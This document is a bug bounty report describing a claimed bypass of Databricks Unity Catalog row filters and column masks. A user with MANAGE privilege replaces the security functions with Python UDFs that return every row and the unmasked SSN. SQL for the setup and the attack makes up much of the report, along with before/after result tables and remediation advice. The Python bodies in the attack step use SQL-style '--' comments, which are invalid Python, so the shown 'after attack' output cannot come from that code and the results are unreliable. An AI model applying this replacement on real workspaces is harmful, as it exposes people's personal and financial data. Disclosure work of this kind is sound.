# HackerOne Report: Unity Catalog Row Filter + Column Mask Bypass via Function Replacement

## Summary
A critical vulnerability in Databricks Unity Catalog allows users with MANAGE privilege on security functions to bypass Row-Level Security (Row Filters) and Column Masking by replacing SQL UDFs with Python UDFs that return permissive values. This enables unauthorized access to ALL rows and unmasked sensitive data (SSN, PII, financial records) across the entire catalog.

## Severity
**Critical** (CVSS 3.1: 9.1)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** Low (MANAGE on function)
- **User Interaction:** None
- **Scope:** Changed
- **Confidentiality Impact:** High
- **Integrity Impact:** High
- **Availability Impact:** None

## Affected Component
- **Product:** Databricks Unity Catalog
- **Feature:** Row Filters + Column Masks
- **Environment:** AWS Serverless SQL Warehouse (DBR 17.2)
- **Tested On:** dbc-4b448b2e-59b6.cloud.databricks.com

## Vulnerability Details

### Background
Unity Catalog uses User-Defined Functions (UDFs) for implementing Row-Level Security (Row Filters) and Column Masking. These functions are typically stored in a dedicated security schema and applied to tables containing sensitive data.

### Attack Scenario
When a user has MANAGE privilege on security functions (commonly granted for maintenance purposes), they can use `CREATE OR REPLACE FUNCTION` with the full catalog.schema.function path to completely replace the security logic.

### Root Cause
1. `CREATE OR REPLACE FUNCTION` with MANAGE privilege allows complete function replacement
2. Row Filter and Column Mask immediately use the new function definition
3. No audit logging specifically for security function modifications
4. Python UDFs can return arbitrary values bypassing all security logic

## Proof of Concept

### Environment Setup
```
Workspace: dbc-4b448b2e-59b6.cloud.databricks.com
Admin user: tanyia45@doncong.com
Non-admin user: sarasofia3@doncong.com (has MANAGE on security functions)
```

### Step 1: Admin creates protected table with security functions
```sql
-- Create security schema and functions
CREATE SCHEMA workspace.security;

CREATE FUNCTION workspace.security.row_filter(user_email STRING) 
  RETURNS BOOLEAN 
  RETURN user_email = current_user();

CREATE FUNCTION workspace.security.mask_ssn(ssn STRING) 
  RETURNS STRING 
  RETURN CONCAT('XXX-XX-', SUBSTR(ssn, 8));

-- Create table with PII data
CREATE TABLE workspace.default.pii_data (
  user_email STRING, 
  ssn STRING, 
  salary INT
);

INSERT INTO workspace.default.pii_data VALUES 
  ('admin@company.com', '123-45-6789', 500000),
  ('ceo@company.com', '111-22-3333', 1000000),
  ('sarasofia3@doncong.com', '987-65-4321', 100000);

-- Apply security policies
ALTER TABLE workspace.default.pii_data 
  SET ROW FILTER workspace.security.row_filter ON (user_email);
ALTER TABLE workspace.default.pii_data 
  ALTER COLUMN ssn SET MASK workspace.security.mask_ssn;

-- Grant SELECT to non-admin user
GRANT SELECT ON TABLE workspace.default.pii_data TO `sarasofia3@doncong.com`;
GRANT MANAGE ON FUNCTION workspace.security.row_filter TO `sarasofia3@doncong.com`;
GRANT MANAGE ON FUNCTION workspace.security.mask_ssn TO `sarasofia3@doncong.com`;
```

### Step 2: Verify security works (BEFORE ATTACK)
```sql
-- As non-admin user sarasofia3@doncong.com
SELECT * FROM workspace.default.pii_data;
```

**Result (BEFORE ATTACK):**
```
| user_email                | ssn          | salary  |
|---------------------------|--------------|---------|
| sarasofia3@doncong.com    | XXX-XX-4321  | 100000  |
```
- Only sees own row ✓
- SSN is masked ✓

### Step 3: Attack - Replace security functions
```sql
-- As non-admin user with MANAGE privilege
CREATE OR REPLACE FUNCTION workspace.security.row_filter(user_email STRING) 
  RETURNS BOOLEAN 
  LANGUAGE PYTHON AS $$ 
return True  -- Returns ALL rows
$$;

CREATE OR REPLACE FUNCTION workspace.security.mask_ssn(ssn STRING) 
  RETURNS STRING 
  LANGUAGE PYTHON AS $$ 
return ssn  -- Returns unmasked SSN
$$;
```

### Step 4: Verify bypass (AFTER ATTACK)
```sql
-- Same query as before
SELECT * FROM workspace.default.pii_data;
```

**Result (AFTER ATTACK):**
```
| user_email                | ssn          | salary   |
|---------------------------|--------------|----------|
| admin@company.com         | 123-45-6789  | 500000   |
| ceo@company.com           | 111-22-3333  | 1000000  |
| sarasofia3@doncong.com    | 987-65-4321  | 100000   |
```
- **Sees ALL 3 rows** (Row Filter bypassed) 🔴
- **SSN is UNMASKED** (Column Mask bypassed) 🔴
- **Executive compensation visible** 🔴

## Impact

### Data Exposure
- Complete bypass of Row-Level Security for ALL tables using the compromised function
- Complete bypass of Column Masking revealing PII (SSN, credit cards, medical records)
- Access to data belonging to ALL users in the organization

### Affected Scenarios
1. **Enterprise PII Protection** - All employee SSN, addresses, phone numbers exposed
2. **Financial Data** - Salaries, bank accounts, transaction history visible
3. **Healthcare** - Patient records, diagnoses, prescriptions accessible
4. **Multi-tenant SaaS** - Cross-customer data leakage

### Attack Prerequisites
- User account with MANAGE privilege on security functions
- This is commonly granted to:
  - Data engineers for function maintenance
  - Security admins who need to update policies
  - Developers in shared development environments

## Remediation Recommendations

### Immediate (Critical)
1. **Revoke MANAGE on security functions** from non-admin users immediately
2. **Create dedicated security service principal** for function management
3. **Enable audit logging** for all function modifications in security schemas

### Short-term
1. **Implement function immutability** for Row Filter and Column Mask functions
2. **Add ownership validation** - only function owner should be able to replace
3. **Block Python UDFs in security functions** or add additional validation

### Long-term
1. **Security function registry** - separate protected storage for security UDFs
2. **Change detection alerts** - notify admins when security functions are modified
3. **Two-person rule** - require additional approval for security function changes

## Timeline
- **2025-12-06 07:42 UTC**: Vulnerability tested and confirmed
- **2025-12-06 07:48 UTC**: PoC developed with complete attack chain
- **2025-12-06 08:00 UTC**: Report prepared

## References
- [Databricks Row Filters Documentation](https://docs.databricks.com/en/data-governance/unity-catalog/row-and-column-filters.html)
- [Unity Catalog Privileges](https://docs.databricks.com/en/data-governance/unity-catalog/manage-privileges/privileges.html)
- [Python UDF Security](https://docs.databricks.com/en/udf/python.html)

---

**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
**Estimated Bounty:** $10,000 - $25,000 (Critical)
**Reporter:** Security Researcher
**Program:** Databricks Bug Bounty (HackerOne)

